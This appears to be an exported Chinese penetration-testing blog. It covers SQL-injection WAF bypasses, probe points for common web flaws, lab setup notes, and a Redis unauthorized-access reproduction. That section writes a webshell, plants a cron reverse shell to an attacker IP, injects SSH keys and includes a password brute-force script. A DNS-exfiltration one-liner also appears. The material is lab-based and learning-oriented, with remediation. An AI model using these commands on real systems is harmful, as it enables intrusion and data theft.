<p>1、大小写绕过（现今几乎无效）</p>
<p>2、替换关键字<br>1&gt; 关键字双写（代码级别waf有效）<br>2&gt; 同价词替换，针对特殊关键词拦截的情况</p>
<pre class="highlight"><span class="line">and --&gt; &amp;&amp;</span><br><span class="line">or --&gt; ||</span><br><span class="line">= --&gt; &lt;、&gt;</span><br><span class="line">空格 --&gt; %20、%09、%0a、%0b、%0c、%0d、%a0、//</span><br></pre>

<p> 3&gt; 特殊字符拼接（mssql支持拼接、mysql不支持拼接）<br>​ ‘test1’+’test2’<br>​<br>3、编码绕过<br>常见的sql编码有unicode、hex、url、ascii、base64等<br>​ 1&gt;url编码（或者二次编码）<br>​ 2&gt;unicode编码（改/为%）<br>​ 常见unicode编码<br>​ 单引号：<code>%u0027</code><br>​ 空格：<code>%u0020</code><br>​ 左括号：<code>%u0028</code><br>​ 右括号：<code>%u0029</code><br>​<br>4、注释绕过<br>利用语言函数特性来绕过waf规则<br>常见注释符：<br><code>//、--、//、#、--+、---、;、--a</code><br>​ 1&gt;普通注释<br>​ <code>/**/</code>在构造查询中插入注释，规避对空格的依赖或关键字识别<br>​ 2&gt;内联注释<br>​ <code>/*!*/</code>表示注释里面的语句会被执行（只有MYSQL能识别）<br>​ <code>/*!50001 select * from test*/</code>表示数据库5.00.01以上版本才会执行该语句<br>​<br>5、参数污染<br>当同一参数出现多次，不同中间件会解析为不同结果。如果WAF只检测了同名参数中的第一个或最后一个，并且中间件特征正好取与WAF相反的参数，则可成功绕过</p>
<table>
<thead>
<tr>
<th align="left">服务器中间件</th>
<th align="left">解析结果</th>
<th>举例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ASP.NET/IIS</td>
<td align="left">所有出现的参数值用逗号连接</td>
<td>par1=var1,val2</td>
</tr>
<tr>
<td align="left">ASP/IIS</td>
<td align="left">所有出现的参数值用逗号连接</td>
<td>par1=var1,var2</td>
</tr>
<tr>
<td align="left">PHP/Apache</td>
<td align="left">仅最后一次出现的参数值</td>
<td>par1=var2</td>
</tr>
<tr>
<td align="left">JSP/Tomcat</td>
<td align="left">仅最后一次出现的参数值</td>
<td>par1=val1</td>
</tr>
<tr>
<td align="left">Perl CGI/Apache</td>
<td align="left">仅第一次出现参数值</td>
<td>par1=var1</td>
</tr>
</tbody></table>
<p>如：</p>
<pre class="highlight"><span class="line">/index.aspx?id=select 1,2,3 from table</span><br><span class="line">--&gt;</span><br><span class="line">/index.aspx?id=select 1&amp;id=,2,3 from table</span><br></pre>

<p>6、缓冲区溢出<br>许多WAF是C语言写的，而C语言本身没有缓冲区保护机制，如果WAF在处理测试向量时超出了其缓冲区长度，会引发bug从而实现绕过<br>如：</p>
<pre class="highlight"><span class="line">?id=1 and (select 1)=(select 0xAAAAAA*1000 more A)+union select 1,2version()-- a</span><br></pre>

<p>7、整合绕过<br>绕过技术结合使用</p>
<p>8、分块传输绕过<br>burpsuite中更实用post传输数据，设置<code>Transfer-encoding: chunked</code><br>使用换行分割数据</p>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>TOP10漏洞探测点</title>
    <url>/article/TOP10%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B%E7%82%B9/</url>
    <content><![CDATA[<table>
<thead>
<tr>
<th align="left">漏洞</th>
<th align="left">探测点</th>
<th align="left">探测顺序</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SQL注入</td>
<td align="left">1、GET（url）变量处 <br>2、POST包data变量处、header变量处</td>
<td align="left">1、单双引号探测 注入方式选择（– a） 数据库类型探测 防护规则探测 注入 <br>2、时间延时盲注探测（msyql-mssql-oracle） <br>3、二次编码探测<br>4、宽字节注入探测</td>
</tr>
<tr>
<td align="left">文件上传</td>
<td align="left">1、后台、编辑器等文件上传处</td>
<td align="left">1、黑白名单探测 <br>2、拦截类型探测（后缀、类型、内容） <br>3、后缀名绕过 <br>4、解析漏洞 <br>5、伪协议读取压缩包（zip://、phar://）</td>
</tr>
<tr>
<td align="left">文件包含</td>
<td align="left">1、GET、POST包调用本地或远程文件处</td>
<td align="left">1、本地文件读取 后缀绕过 伪协议读取（file://、php://filter） <br>2、远程文件读取 http、ftp 后缀绕过、python响应包伪造 伪协议读取（php://input、data://）</td>
</tr>
<tr>
<td align="left">命令执行</td>
<td align="left">1、执行系统命令处</td>
<td align="left">1、连接字符挨个尝试</td>
</tr>
<tr>
<td align="left">XSS</td>
<td align="left">1、所有文本框输入处（留言板）</td>
<td align="left">1、闭合符判断是否存在xss <br>2、判断标签位置，是否要闭合标签 <br>3、构造payload（&lt;&gt;、伪协议、事件、远程加载） <br>4、绕过</td>
</tr>
<tr>
<td align="left">CSRF</td>
<td align="left">1、进入后台后修改设置信息处 （公网IP） <br>注：可同时检查越权漏洞（登录、修改信息）</td>
<td align="left">1、GET请求、form表单 <br>2、ajax跨域请求</td>
</tr>
<tr>
<td align="left">XXE</td>
<td align="left">1、xml格式的POST数据包处</td>
<td align="left">1、判断是否有显示位 <br>有：直接执行数据 <br>无：数据外带</td>
</tr>
<tr>
<td align="left">SSRF</td>
<td align="left">1、涉及网址调用处理的地方</td>
<td align="left">1、文件读取（直接读取、伪协议读取等，参考文件包含） <br>2、内网IP探测（http） <br>3、内网端口探测（dict://、gopher://）</td>
</tr>
<tr>
<td align="left">逻辑漏洞</td>
<td align="left">1、登录界面 <br>2、含有数据发送处（修改等）</td>
<td align="left">1、登录爆破（验证码绕过、清除token信息、短信轰炸等） <br>2、修改用户信息（用户名、手机号、邮箱等具体账户信息；操作步骤等逻辑信息） <br>3、修改数据信息（多为uid等短数字，唯一标识用户身份，类似数据库的id；或者其他有意义的数字型参数，金额等）</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>思路</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis未授权访问漏洞复现</title>
    <url>/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h1><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p>
<h1 id="二、漏洞特征"><a href="#二、漏洞特征" class="headerlink" title="二、漏洞特征"></a>二、漏洞特征</h1><p>开放6379端口，可尝试免密登录</p>
<p>漏洞版本：Redis 2.x，3.x，4.x，5.x</p>
<pre class="highlight"><span class="line">redis-cli -h x.x.x.x</span><br><span class="line">或</span><br><span class="line">redis-cli -h x.x.x.x -p 6379</span><br></pre>

<h1 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>攻击机：Kali2020.1</p>
<p>靶机：Ubuntu20 + Redis2.8.17</p>
<p>1、下载环境</p>
<pre class="highlight"><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br></pre>

<p>2、解压并进入安装目录</p>
<pre class="highlight"><span class="line">tar xzf redis-2.8.17.tar.gz</span><br><span class="line">make</span><br></pre>

<p>报错：</p>
<pre class="highlight"><span class="line">gcc: Command not found</span><br></pre>

<p>解决：安装gcc</p>
<pre class="highlight"><span class="line">apt install gcc</span><br></pre>

<p>清理编译文件，重新编译</p>
<pre class="highlight"><span class="line">make distclean  &amp;&amp; make</span><br></pre>

<p>3、</p>
<p>拷贝关键文件</p>
<pre class="highlight"><span class="line">cp redis.conf /etc/</span><br><span class="line">cd src</span><br><span class="line">cp redis-benchmark redis-cli redis-server /usr/bin/</span><br></pre>

<p>4、启动</p>
<pre class="highlight"><span class="line">./redis-server		#src目录</span><br></pre>

<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162755821.png" alt="image-20210809162755821" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162755821.png" class="lozad post-image"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="无密码登录"><a href="#无密码登录" class="headerlink" title="无密码登录"></a>无密码登录</h3><pre class="highlight"><span class="line">redis-cli -h 192.168.24.79		#登录</span><br></pre>

<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162803617.png" alt="image-20210809162803617" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162803617.png" class="lozad post-image"></p>
<p>登陆成功</p>
<h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>前提：登陆成功、知道路径（phpinfo或错误暴路径等）、读写权限等</p>
<p>因为没有搭建网站环境，这里写在用户根目录</p>
<pre class="highlight"><span class="line">config set dir /home/chen/</span><br><span class="line">config set dbfilename redis.php	</span><br><span class="line">set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">或</span><br><span class="line">set x &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre>

<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162814551.png" alt="image-20210809162814551" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162814551.png" class="lozad post-image"></p>
<p>靶机成功写入</p>
<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162823433.png" alt="image-20210809162823433" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162823433.png" class="lozad post-image"></p>
<h3 id="定时反弹shell"><a href="#定时反弹shell" class="headerlink" title="定时反弹shell"></a>定时反弹shell</h3><p>需要管理员权限</p>
<pre class="highlight"><span class="line">nc -lvnp 4444		# 攻击机开启监听</span><br><span class="line"></span><br><span class="line"># 连接redis，写定时反弹shell</span><br><span class="line">redis-cli -h 192.168.24.79</span><br><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.24.82/4444 0&gt;&amp;1\n\n&quot;		#每分钟执行一次反弹连接</span><br><span class="line">save</span><br></pre>

<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162930370.png" alt="image-20210809162930370" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162930370.png" class="lozad post-image"></p>
<p>注意！</p>
<p>1、Ubuntu系统需要以管理员权限更改/bin下的软链接指向</p>
<pre class="highlight"><span class="line">ln -s -f bash /bin/sh		# 定时任务bash为dash,无交互功能</span><br></pre>

<p>2、Ubuntu下定时任务乱码则不执行，需手动删除乱码</p>
<p>3、redis远程连接创建定时任务权限为644，但是定时任务权限需要为600才可执行</p>
<pre class="highlight"><span class="line">chmod 600 root</span><br></pre>

<p>解决以上坑点，成功反弹shell</p>
<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162939325.png" alt="image-20210809162939325" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162939325.png" class="lozad post-image"></p>
<p>但是这样意义不大，据说centos无以上坑点。</p>
<h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p>1、攻击机生成ssh密钥（空密码）</p>
<pre class="highlight"><span class="line">ssh-keygen -t rsa		# 全部回车</span><br><span class="line">cd .ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt		# 写入公钥</span><br></pre>

<p>2、设置redis变量</p>
<pre class="highlight"><span class="line">cat ./key.txt | redis-cli -h 192.168.24.79 -x set tide		# 将公钥内容设置给redis变量（靶机ip）</span><br></pre>

<p>3、连接redis并写入</p>
<pre class="highlight"><span class="line">redis-cli -h 192.168.24.79</span><br><span class="line">config set dir /root/.ssh					# 默认公私钥路径</span><br><span class="line">config set dbfilename authorized_keys		# 写入authorized_keys</span><br><span class="line">save</span><br></pre>

<p>4、检查靶机文件是否写入–已写入（同样带有乱码）</p>
<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162954548.png" alt="image-20210809162954548" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162954548.png" class="lozad post-image"></p>
<p>5、攻击机进行ssh连接</p>
<pre class="highlight"><span class="line">ssh -o StrictHostKeyChecking=no 192.168.24.79		# 首次连接需要加-o StrictHostKeyChecking=no</span><br></pre>

<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163005569.png" alt="image-20210809163005569" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163005569.png" class="lozad post-image"></p>
<p>连接成功</p>
<p>（注：靶机需要安装ssh服务并关闭防火墙，或者允许22端口通过防火墙）</p>
<p>附Ubuntu安装ssh</p>
<pre class="highlight"><span class="line">sudo apt-get install openssh-server		# 安装ssh</span><br><span class="line">sudo /etc/init.d/ssh start 				# 开启ssh</span><br><span class="line">ufw allow 22/tcp						# 允许通过防火墙</span><br><span class="line">或</span><br><span class="line">sudo ufw disable						# 不建议</span><br></pre>

<h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><p>redis:4.x - redis:5.0.5版本漏洞，redis开启主从复制，主从数据相同，主redis只写，从redis只读，从而减小服务器压力。在Redis 4.x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so恶意文件，就可以拓展新命令。</p>
<p>到这里懒癌犯了，不想搭环境了，附上脚本下载链接，直接过，遇到回头再来。</p>
<pre class="highlight"><span class="line">https://github.com/n0b0dyCN/redis-rogue-server</span><br></pre>

<p>这里还有个内网redis利用姿势–gopher协议，一并懒过去。</p>
<h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>感觉这个比较实用，弱口令yyds！</p>
<p>准备：</p>
<p>打开redis.conf配置文件，找到requirepass，去掉注释，修改后面的参数，即为密码</p>
<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163040446.png" alt="image-20210809163040446" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163040446.png" class="lozad post-image"></p>
<p>密码登录</p>
<pre class="highlight"><span class="line">redis-cli -h 192.168.24.79 -a password</span><br></pre>

<p>以上，开始编写Python脚本</p>
<pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：redis未授权访问探测 + 密码爆破</span><br><span class="line">    author: chen</span><br><span class="line">    date: 2021-07-03</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def poc():</span><br><span class="line">    global flag</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((ip, port))</span><br><span class="line">    # 发送INFO，如果无密码则返回服务器信息，包含版本信息；如果有密码，则返回“-NOAUTH Authentication required”</span><br><span class="line">    s.send(&#x27;INFO\r\n&#x27;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    result = s.recv(1024).decode(&#x27;utf-8&#x27;)</span><br><span class="line">    if &quot;redis_version&quot; in result:</span><br><span class="line">        print(&quot;存在redis未授权访问漏洞！&quot;)</span><br><span class="line">        flag = True</span><br><span class="line">    elif &quot;Authentication&quot; in result:</span><br><span class="line">        flag = False</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;未知错误&quot;)</span><br><span class="line">        flag = None</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def burst():</span><br><span class="line">    while not q.empty():</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, port))</span><br><span class="line">        _pass = q.get()</span><br><span class="line">        msg = &quot;AUTH &quot; + _pass + &quot;\r\n&quot;          # AUTH pass 为redis密码格式</span><br><span class="line">        s.send(msg.encode(&#x27;utf-8&#x27;))</span><br><span class="line">        result = s.recv(1024).decode(&#x27;utf-8&#x27;)</span><br><span class="line">        if &#x27;+OK&#x27; in result:</span><br><span class="line">            print(&quot;存在弱口令，密码为%s&quot; % _pass)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    if len(sys.argv) != 5:</span><br><span class="line">        print(&quot;请按照格式输出：\n&quot;)</span><br><span class="line">        print(&quot;redis.py 10.10.10.10 6379 字典名 线程数 \n&quot;)</span><br><span class="line"></span><br><span class="line">    flag = True</span><br><span class="line">    q = queue.Queue()</span><br><span class="line"></span><br><span class="line">    ip = sys.argv[1]</span><br><span class="line">    port = int(sys.argv[2])</span><br><span class="line">    dic = sys.argv[3]</span><br><span class="line">    thread = sys.argv[4]</span><br><span class="line"></span><br><span class="line">    poc()</span><br><span class="line"></span><br><span class="line">    if flag:</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        path = os.path.dirname(os.path.realpath(__file__))      # 获取当前脚本目录</span><br><span class="line">        for i in open(path + &#x27;/&#x27; + dic):</span><br><span class="line">            q.put(i.strip())                                    # 清洗字符，去掉头尾的换行和空格</span><br><span class="line">        for i in range(int(thread)):</span><br><span class="line">            t = threading.Thread(target=burst(), daemon=True)</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        pass</span><br></pre>

<p>结果：</p>
<p>空密码：</p>
<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163058335.png" alt="image-20210809163058335" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163058335.png" class="lozad post-image"></p>
<p>设置密码</p>
<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163105143.png" alt="image-20210809163105143" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163105143.png" class="lozad post-image"></p>
<p>————————————————————————————————————————————————————————————</p>
<p>修改脚本，链接：</p>
<p><a href="https://www.zerochen.top/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/">Pocsuite3重写redis脚本 (zerochen.top)</a></p>
<h1 id="四、修复"><a href="#四、修复" class="headerlink" title="四、修复"></a>四、修复</h1><h2 id="指定ip登录"><a href="#指定ip登录" class="headerlink" title="指定ip登录"></a>指定ip登录</h2><p>在redis.conf文件找到# bind 127.0.0.1，去掉注释，修改为指定的登录ip</p>
<p>缺点：多点登陆失效。</p>
<h2 id="增加密码"><a href="#增加密码" class="headerlink" title="增加密码"></a>增加密码</h2><p>打开redis.conf配置文件，找到requirepass，去掉注释，修改后面的参数，即为密码</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建Docker + Vulhub</title>
    <url>/article/Ubuntu%E6%90%AD%E5%BB%BADocker-Vulhub/</url>
    <content><![CDATA[<h1 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h1><pre class="highlight"><span class="line">sudo apt install docker.io -y</span><br><span class="line">yum install docker  	# centos	</span><br><span class="line">docker -v	#查看版本</span><br></pre>

<p>安装pip</p>
<pre class="highlight"><span class="line">sudo apt install python3-pip -y</span><br></pre>

<h1 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h1><pre class="highlight"><span class="line">pip3 install docker-compose</span><br><span class="line">docker-compose -v		#查看版本</span><br></pre>

<p>拉取vulhub</p>
<pre class="highlight"><span class="line">git clone https://github.com/vulhub/vulhub.git		#在桌面环境</span><br></pre>



<h1 id="Docker命令"><a href="#Docker命令" class="headerlink" title="Docker命令"></a>Docker命令</h1><pre class="highlight"><span class="line">docker pull xx:latest		# 安装xx镜像</span><br><span class="line">docker images				# 查看安装的镜像</span><br><span class="line">docker run -it -d -p 6379:6379 redis		# 运行镜像</span><br></pre>



<h1 id="Docker-compose命令"><a href="#Docker-compose命令" class="headerlink" title="Docker-compose命令"></a>Docker-compose命令</h1><pre class="highlight"><span class="line">docker-compose up -d		#拉起容器镜像</span><br><span class="line">docker-compose down 		#关闭容器镜像</span><br></pre>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Web渗透随记</title>
    <url>/article/Web%E6%B8%97%E9%80%8F%E9%9A%8F%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="DNS外带"><a href="#DNS外带" class="headerlink" title="DNS外带"></a>DNS外带</h1><p>平台：</p>
<p><a href="http://dnslog.cn/">http://dnslog.cn/</a> #需要生成随机DNS</p>
<p>使用：</p>
<pre class="highlight"><span class="line">ping `whoami`.dns</span><br></pre>

<p>（注：``为优先运行符，可以用$()代替）</p>
<p>适用：</p>
<p>注入、反序列化、命令执行等无回显情况下，外带数据看结果</p>
<h1 id="Windows开启3389端口"><a href="#Windows开启3389端口" class="headerlink" title="Windows开启3389端口"></a>Windows开启3389端口</h1><p>注：Win7、Win2003、XP系统</p>
<p>开启：</p>
<pre class="highlight"><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre>

<p>关闭：</p>
<pre class="highlight"><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br></pre>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>随记</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows搭建IIS+MSSql</title>
    <url>/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/</url>
    <content><![CDATA[<h1 id="一、搭建IIS服务"><a href="#一、搭建IIS服务" class="headerlink" title="一、搭建IIS服务"></a>一、搭建IIS服务</h1><h2 id="1、搭建IIS服务"><a href="#1、搭建IIS服务" class="headerlink" title="1、搭建IIS服务"></a>1、搭建IIS服务</h2><p>开始-管理工具-服务器管理器-角色-IIS服务-自定义服务（ASP模块、FTP模块等）</p>
<h2 id="2、导入ASP网站"><a href="#2、导入ASP网站" class="headerlink" title="2、导入ASP网站"></a>2、导入ASP网站</h2><p>选择网站路径</p>
<p>修改网站访问端口号</p>
<h2 id="3、网站配置"><a href="#3、网站配置" class="headerlink" title="3、网站配置"></a>3、网站配置</h2><table>
<thead>
<tr>
<th align="left">报错类型</th>
<th align="left">做法</th>
</tr>
</thead>
<tbody><tr>
<td align="left">403（无访问主程序）</td>
<td align="left">修改默认文档，增加index.asp</td>
</tr>
<tr>
<td align="left">500（无法访问文件）</td>
<td align="left">ASP-启用父路径</td>
</tr>
<tr>
<td align="left">提示未启用32位程序池</td>
<td align="left">应用程序池-网站-高级设置-32位应用程序池-True</td>
</tr>
<tr>
<td align="left">没有操作权限</td>
<td align="left">修改www目录权限： 属性-安全-编辑-修改Users权限为完全控制</td>
</tr>
</tbody></table>
<h1 id="安装SQL-Server数据库并导入原有数据库"><a href="#安装SQL-Server数据库并导入原有数据库" class="headerlink" title="安装SQL Server数据库并导入原有数据库"></a>安装SQL Server数据库并导入原有数据库</h1><p>1、winserver2008连接sql server镜像，选择安装（精简功能）</p>
<p><img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143026487.png" alt="image-20210809143026487" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143026487.png" class="lozad post-image"></p>
<p>2、限制数据库权限（从管理员权限降权）</p>
<p><img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143259187.png" alt="image-20210809143259187" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143259187.png" class="lozad post-image"></p>
<p>3、混合模式，设置密码，添加管理员</p>
<p><img src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143322279.png" alt="image-20210809143322279" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Windows%E6%90%AD%E5%BB%BAIIS-MSSql/image-20210809143322279.png" class="lozad post-image"></p>
<p>4、后续全部确认即可</p>
<p>5、新建数据库（testdb）</p>
<p>6、修改网站数据库配置文件，数据库类型为mssql</p>
<p>7、替换网站原有数据库</p>
<p>8、修改网站数据库配置文件</p>
<p>新增数据库名（testdb）、数据库账号（sa）、数据库密码（***）</p>
